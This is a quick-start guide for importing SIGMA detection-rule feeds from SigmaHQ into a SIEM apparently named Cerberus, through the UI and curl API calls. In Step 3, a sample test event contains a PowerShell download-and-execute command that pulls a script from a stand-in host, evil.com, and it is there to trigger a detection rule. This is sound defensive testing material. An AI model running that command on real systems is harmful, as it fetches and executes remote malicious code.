# SIGMA Rule Feeds - Quick Start Guide

## Get Started in 5 Minutes

This guide will help you set up your first SIGMA rule feed and start importing detection rules.

---

## Prerequisites

Before you begin, ensure you have:

- Cerberus SIEM installed and running
- API access with authentication token
- Network connectivity to feed sources (GitHub, etc.)
- (Optional) UI access for visual configuration

**Permissions Required**:
- `read:feeds` - View feed configurations
- `write:feeds` - Create and manage feeds

---

## Step 1: Add Your First Feed

We'll start by adding the official SigmaHQ rule repository, which contains thousands of community-maintained detection rules.

### Option A: Using the UI

1. **Navigate to Feeds Page**
   - Open Cerberus UI in your browser
   - Go to **Configuration** → **Feeds**

2. **Create Feed from Template**
   - Click **"Create Feed from Template"** button
   - Select **"SigmaHQ Official Rules (Main)"**
   - Review pre-filled configuration:
     ```
     Name: SigmaHQ Official Rules (Main)
     Type: Git
     URL: https://github.com/SigmaHQ/sigma.git
     Branch: master
     Include Paths: rules/
     ```

3. **Customize Settings** (Optional)
   - **Auto-enable rules**: Leave unchecked initially
   - **Update strategy**: Select "Manual" for now
   - **Priority**: Keep default (100)

4. **Test Connection**
   - Click **"Test Connection"** button
   - Wait for success message
   - If it fails, check network connectivity

5. **Create Feed**
   - Click **"Create Feed"** button
   - Feed is now created but not yet synchronized

### Option B: Using the API

```bash
# Set your API token
export TOKEN="your-jwt-token-here"

# Create feed
curl -X POST http://localhost:8081/api/v1/feeds \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SigmaHQ Official Rules",
    "description": "Official SIGMA rules from SigmaHQ repository",
    "type": "git",
    "url": "https://github.com/SigmaHQ/sigma.git",
    "branch": "master",
    "include_paths": ["rules/"],
    "exclude_paths": ["rules/deprecated/"],
    "auto_enable_rules": false,
    "priority": 100,
    "update_strategy": "manual",
    "enabled": true,
    "tags": ["official", "sigmahq"]
  }'
```

**Expected Response**:
```json
{
  "feed": {
    "id": "feed-abc123",
    "name": "SigmaHQ Official Rules",
    "status": "active",
    "enabled": true,
    "created_at": "2025-01-15T10:00:00Z",
    ...
  }
}
```

**Save the Feed ID** - you'll need it for the next steps!

---

## Step 2: Manual Sync Walkthrough

Now let's synchronize the feed to import rules.

### Option A: Using the UI

1. **Navigate to Feed Details**
   - Go to **Feeds** page
   - Click on **"SigmaHQ Official Rules"** feed

2. **Trigger Synchronization**
   - Click **"Sync Now"** button
   - A progress indicator appears

3. **Monitor Progress**
   - Watch the status change from "Active" → "Syncing" → "Active"
   - Sync typically takes 30-60 seconds for SigmaHQ repository

4. **View Results**
   - Sync completes automatically
   - Statistics update on the feed details page
   - Example results:
     ```
     Total Rules: 3,245
     Imported: 3,200
     Failed: 45
     Duration: 42.3s
     ```

### Option B: Using the API

```bash
# Replace with your feed ID from Step 1
FEED_ID="feed-abc123"

# Trigger sync (asynchronous operation)
curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/sync \
  -H "Authorization: Bearer $TOKEN"
```

**Response** (202 Accepted):
```json
{
  "status": "accepted",
  "message": "Feed synchronization started in background. Poll the stats endpoint to check completion status.",
  "feed_id": "feed-abc123",
  "status_url": "/api/v1/feeds/feed-abc123/stats"
}
```

**Poll for Completion**:
```bash
# Check sync status every 5 seconds
while true; do
  STATUS=$(curl -s http://localhost:8081/api/v1/feeds/$FEED_ID/stats \
    -H "Authorization: Bearer $TOKEN" | jq -r '.status')

  echo "Status: $STATUS"

  if [ "$STATUS" != "syncing" ]; then
    break
  fi

  sleep 5
done

echo "Sync completed!"
```

**View Final Stats**:
```bash
curl http://localhost:8081/api/v1/feeds/$FEED_ID/stats \
  -H "Authorization: Bearer $TOKEN" | jq '{
    total_rules,
    imported_rules,
    updated_rules,
    failed_rules,
    last_sync_duration
  }'
```

**Example Output**:
```json
{
  "total_rules": 3245,
  "imported_rules": 3200,
  "updated_rules": 0,
  "failed_rules": 45,
  "last_sync_duration": 42.3
}
```

---

## Step 3: Verify Rules are Imported

Let's confirm the rules were successfully imported into Cerberus.

### Option A: Using the UI

1. **Navigate to Rules Page**
   - Go to **Detection** → **Rules**

2. **Filter by Feed**
   - Look for rules with source matching your feed name
   - Rules will show metadata: `feed: SigmaHQ Official Rules`

3. **Check Rule Count**
   - Total rule count should match imported count from stats
   - If you see ~3,200 rules, import was successful!

4. **View Rule Details**
   - Click on any rule to view details
   - Verify SIGMA YAML content is present
   - Check that rule is valid (green checkmark)

5. **Enable Rules** (Optional)
   - Select a few rules to test
   - Click **"Enable Selected"**
   - Rules will now trigger on matching events

### Option B: Using the API

```bash
# Count total rules
curl http://localhost:8081/api/v1/rules \
  -H "Authorization: Bearer $TOKEN" | jq '.total'

# Search for rules from specific feed
curl "http://localhost:8081/api/v1/rules?feed_id=$FEED_ID&limit=10" \
  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {
    id,
    title,
    severity,
    enabled
  }'
```

**Example Output**:
```json
[
  {
    "id": "rule-001",
    "title": "Suspicious PowerShell Execution",
    "severity": "high",
    "enabled": false
  },
  {
    "id": "rule-002",
    "title": "Failed SSH Login Attempt",
    "severity": "medium",
    "enabled": false
  },
  ...
]
```

**Enable a Test Rule**:
```bash
# Enable a specific rule
RULE_ID="rule-001"

curl -X PUT http://localhost:8081/api/v1/rules/$RULE_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "enabled": true
  }'
```

**Test Rule Matching**:
```bash
# Send a test event that should match
curl -X POST http://localhost:8081/api/v1/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "process",
    "process": "powershell.exe",
    "command": "IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/malware.ps1\")",
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
  }'

# Check for generated alert
curl http://localhost:8081/api/v1/alerts?limit=1 \
  -H "Authorization: Bearer $TOKEN" | jq '.items[0]'
```

---

## Step 4: Next Steps

Congratulations! You've successfully configured your first SIGMA rule feed. Here's what to do next:

### 1. Configure Automatic Updates

**Enable Scheduled Synchronization**:

```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "update_strategy": "scheduled",
    "update_schedule": "0 2 * * *"
  }'
```

This will sync the feed daily at 2 AM.

**Verify Schedule**:
```bash
curl http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" | jq '{
    update_strategy,
    update_schedule,
    next_sync
  }'
```

### 2. Add More Feeds

**Additional Recommended Feeds**:

- **SigmaHQ Emerging Threats** (latest threat detection rules):
  ```json
  {
    "name": "SigmaHQ Emerging Threats",
    "type": "git",
    "url": "https://github.com/SigmaHQ/sigma.git",
    "branch": "master",
    "include_paths": ["rules/emerging-threats/"],
    "priority": 90
  }
  ```

- **Custom Internal Rules** (your organization's rules):
  ```json
  {
    "name": "Custom Internal Rules",
    "type": "filesystem",
    "path": "/opt/cerberus/custom-rules",
    "priority": 80,
    "auto_enable_rules": true
  }
  ```

### 3. Refine Rule Filters

**Filter by Severity** (only import high/critical rules):
```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "min_severity": "high"
  }'
```

**Filter by Tags** (e.g., only Windows rules):
```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "include_tags": ["windows", "attack.execution"]
  }'
```

**Exclude Experimental Rules**:
```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "exclude_paths": ["rules/experimental/", "rules/deprecated/"]
  }'
```

### 4. Enable Auto-Import

If you trust the feed source, enable automatic rule activation:

```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "auto_enable_rules": true
  }'
```

**Warning**: Only enable auto-import for trusted feeds after validating rule quality in a test environment.

### 5. Monitor Feed Health

**Set up Monitoring**:

```bash
# Check overall feed health
curl http://localhost:8081/api/v1/health/feeds \
  -H "Authorization: Bearer $TOKEN" | jq

# View sync history
curl "http://localhost:8081/api/v1/feeds/$FEED_ID/history?limit=10" \
  -H "Authorization: Bearer $TOKEN" | jq '.[] | {
    start_time,
    duration,
    success,
    imported_rules: .stats.imported_rules,
    failed_rules: .stats.failed_rules
  }'
```

**Configure Alerts** (if using Prometheus):
- Alert on feed sync failures
- Alert on high rule failure rates (>10%)
- Alert on missing scheduled syncs

### 6. Review and Tune Rules

**Identify High-Value Rules**:
1. Review alerts generated by imported rules
2. Identify false positives and tune rules
3. Disable noisy rules or adjust detection logic
4. Enable high-quality rules for production use

**Create Rule Exceptions**:
- Use Cerberus rule exceptions to handle false positives
- Document exceptions for audit trail

---

## Common Questions

### Q: How long does the initial sync take?

**A**: Initial sync duration depends on repository size:
- SigmaHQ main repository: 30-60 seconds (~3,200 rules)
- Smaller feeds: 5-15 seconds
- Large custom repositories: 1-3 minutes

Network speed and system resources also affect sync time.

### Q: Why are some rules failing to import?

**A**: Rules may fail for several reasons:
- Invalid SIGMA YAML syntax (upstream issue)
- Unsupported SIGMA features
- Missing required fields
- Incompatible rule format

**Solution**: Check sync history for specific errors:
```bash
curl "http://localhost:8081/api/v1/feeds/$FEED_ID/history?limit=1" \
  -H "Authorization: Bearer $TOKEN" | \
  jq '.[] | .rule_results[] | select(.action == "failed")'
```

Most failures are upstream issues that don't affect overall detection capability.

### Q: Should I enable auto_enable_rules?

**A**:
- **No** (default): New rules are imported but disabled. You manually review and enable rules.
- **Yes**: New rules are automatically enabled. Use only for trusted feeds after validation.

**Recommendation**: Start with `auto_enable_rules: false`, review rule quality, then enable for trusted feeds.

### Q: Can I have multiple feeds?

**A**: Yes! You can configure multiple feeds. Use priorities to control conflict resolution:
- Higher priority feed wins if same rule exists in multiple feeds
- Typical setup: Official feeds (priority 100), custom feeds (priority 80)

### Q: How do I update feed configuration after creation?

**A**: Use the PUT endpoint:
```bash
curl -X PUT http://localhost:8081/api/v1/feeds/$FEED_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "description": "Updated description",
    "update_schedule": "0 3 * * *"
  }'
```

Only provided fields are updated (partial update).

### Q: What happens if I delete a feed?

**A**:
- Feed configuration is deleted
- Scheduled syncs stop
- **Imported rules remain** in the system (not deleted)

To remove rules, manually delete them from the Rules page.

### Q: How do I troubleshoot sync failures?

**A**:
1. **Check feed status**:
   ```bash
   curl http://localhost:8081/api/v1/feeds/$FEED_ID \
     -H "Authorization: Bearer $TOKEN" | jq '{status, stats.last_error}'
   ```

2. **Test connection**:
   ```bash
   curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/test \
     -H "Authorization: Bearer $TOKEN"
   ```

3. **Review logs**:
   ```bash
   grep "feed.*$FEED_ID" /var/log/cerberus/cerberus.log
   ```

4. **Check sync history**:
   ```bash
   curl "http://localhost:8081/api/v1/feeds/$FEED_ID/history?limit=5" \
     -H "Authorization: Bearer $TOKEN" | jq '.[] | {start_time, success, errors}'
   ```

---

## Quick Reference

### Essential Commands

```bash
# List all feeds
curl http://localhost:8081/api/v1/feeds -H "Authorization: Bearer $TOKEN"

# Get feed details
curl http://localhost:8081/api/v1/feeds/$FEED_ID -H "Authorization: Bearer $TOKEN"

# Sync feed manually
curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/sync -H "Authorization: Bearer $TOKEN"

# Check sync status
curl http://localhost:8081/api/v1/feeds/$FEED_ID/stats -H "Authorization: Bearer $TOKEN"

# View sync history
curl "http://localhost:8081/api/v1/feeds/$FEED_ID/history?limit=10" -H "Authorization: Bearer $TOKEN"

# Test connection
curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/test -H "Authorization: Bearer $TOKEN"

# Enable/disable feed
curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/enable -H "Authorization: Bearer $TOKEN"
curl -X POST http://localhost:8081/api/v1/feeds/$FEED_ID/disable -H "Authorization: Bearer $TOKEN"

# Delete feed
curl -X DELETE http://localhost:8081/api/v1/feeds/$FEED_ID -H "Authorization: Bearer $TOKEN"
```

### Common Cron Schedules

```bash
"0 2 * * *"      # Daily at 2 AM
"0 */6 * * *"    # Every 6 hours
"0 0 * * 0"      # Weekly on Sunday at midnight
"0 0 1 * *"      # Monthly on the 1st at midnight
"0 3 * * 1-5"    # Weekdays at 3 AM
```

---

## Additional Resources

- **Full Documentation**: [SIGMA Feeds Operator Guide](operations/sigma-feeds.md)
- **API Reference**: [Swagger Documentation](swagger.yaml)
- **SIGMA Specification**: [https://github.com/SigmaHQ/sigma/wiki/Specification](https://github.com/SigmaHQ/sigma/wiki/Specification)
- **SigmaHQ Repository**: [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)

---

**Ready to start?** Follow Step 1 above to add your first feed! 🚀
